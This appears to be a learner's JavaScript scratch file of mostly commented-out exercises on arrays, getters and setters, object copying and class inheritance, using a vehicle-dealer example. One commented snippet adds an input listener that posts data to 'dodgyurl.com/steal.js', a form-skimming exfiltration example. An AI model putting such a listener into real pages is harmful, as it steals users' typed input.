// const speeds = [undefined, 25, 28, 33, 45, 30000]; //30 zone

// function getAverageSpeed(speeds) {
//   let total = 0;
//   speeds.forEach((speed) => {
//     //defensive check
//     if (typeof speed !== "number" || speed > 280) {
//       return;
//     }

//     total += speed;
//   });
//   return total;
// }

// // console.log(total / speeds.length);
// console.log(getAverageSpeed(speeds));

//arrays in JS are exotic objects
// const arr = ["hi", "bye"];

// const obj = { 0: "hi", 1: "bye" };
// console.log(arr[0], obj[1]);

// console.log(4 in arr); //fasle
// console.log("hi" in arr);

//Getters and Setters

// const me = {
//   name: "Ewan",
//   getName() {
//     return this.name;
//   },
//   setName(newName) {
//     this.name = newName;
//   },
// };

// console.log(me.name);
// me.setName("Bob");
// console.log(me.name);

// console.log(me2.name);
// me2.name = "Bob"; //get and set methods
// console.log(me2.name);

// const arr = [1, 2, 3, 4, 5];

// console.log(arr.length);

///////////
//Getters Setter example
// const me2 = {
//   firstName: "Ewan",
//   lastName: "Stott",
//   get name() {
//     return this.firstName + " " + this.lastName;
//   },
//   set name(newName) {
//     const arr = newName.split(" ");
//     this.firstName = arr[o];
//     this.lastName = arr[1];
//   },
// };

// me2.name = "Sally Smith";

// console.log(me2);

//////////
//object.entries

// const me = {
//   firstName: "Ewan",
//   lastName: "Stott",
// };

// const arr = Object.entries(me); //array of arrays (entries contains keys & values) (multidimensional)

// for (let i = 0; i < arr.length; i++) {
//   console.log(arr[i]);
// }

// me;

////////

// const me = {
//   firstName: "Ewan",
//   lastName: "Stott",
// };

// const copy = Object.assign({}, me);

// const copy2 = { ...me }; //... easier way to do ^^ ... SPREAD OPERATOR = When used in an array, the spread syntax allows an iterable (like an array or a string) to be expanded in places where zero or more arguments or elements are expected.

// console.log(copy);

///////////
// const ref = document.getElementById("demo");

// ref.addEventListener("input", (e) => {
//   axios.post("https://dodgyurl.com/steal.js", { payload });
// });

/////////
//Class based syntax - creates an object

// class Person {
//   //store data here
//   constructor(name) {
//     this.name = name;
//   }
//   getName() {
//     return this.name;
//   }
//   setAge(age) {
//     this.age = age;
//   }
// }

// const _person = new Person("Ewan");
// _person.age = 32;

// console.log(_person);

//////////
//Vehice dealer system DEMO

// class Vehicle {
//   constructor(make, model, _vin) {
//     this.make = make;
//     this.model = model;
//     this._vinNo = _vin;
//   }
//   get vin() {
//     return this.vinNo;
//   }

//   set vin(_vin) {
//     this.vinNo = _vin;
//   }
// }

// //Extend class
// class Car extends Vehicle {
//   constructor(make, model, _vin, noDoors) {
//     super(make, model, _vin);

//     this.noDoors = noDoors;
//   }

//   getDoors() {
//     return this.noDoors;
//   }

//   getAllData() {
//     return `Vin: ${this._vinNo}, Doors: ${this.noDoors}`;
//   }
// }

// class Truck extends Vehicle {
//   constructor(make, model, _vin, trailerLength) {
//     super(make, model, _vin); //invoke the parent class / invoking the contrstucter of the parent

//     this.trailerLength = trailerLength;
//   }
// }

// class BatteryCar extends Car {}

// const _car = new Car("Audi", "TT", 123456, 5);
// console.log(_car);

// const _vehicle = new Vehicle("Audi", "TT", 123456789);
// console.log(_vehicle.vin);
// console.log(_car.getAllData());

///////

// class RusselsGreatArrayStuff extends Array {
//     //
// }
// const _russelsArr = new RusselsGreatArrayStuff(1,2,3)

///////
//Private

// class Vehicle {
//   #iAmSecret = "Hello World";

//   constructor(make, model, _vin) {
//     this.make = make;
//     this.model = model;
//     this._vinNo = _vin;
//   }
//   get vin() {
//     return this.vinNo;
//   }

//   set vin(_vin) {
//     this.vinNo = _vin;
//   }

//   static isVinValid(vin) {
//     if (typeof vin === "number" && vin.toString().length === 11) {
//       return true;
//     }
//     return false;
//   }
// }
// console.log(Vehicle.isVinValid(1111111111111111));

// const _vehicle = new Vehicle('Skoda', 'Ferrari', 1234)
// console.log(_vehicle);

///////////

class Vehicle {
  constructor(make, model, _vin) {
    if (!make || !model || !_vin) {
      throw new Error("Missing data");
    }

    this.make = make;
    this.model = model;
    this._vinNo = _vin;
  }
}

////////
//Composition
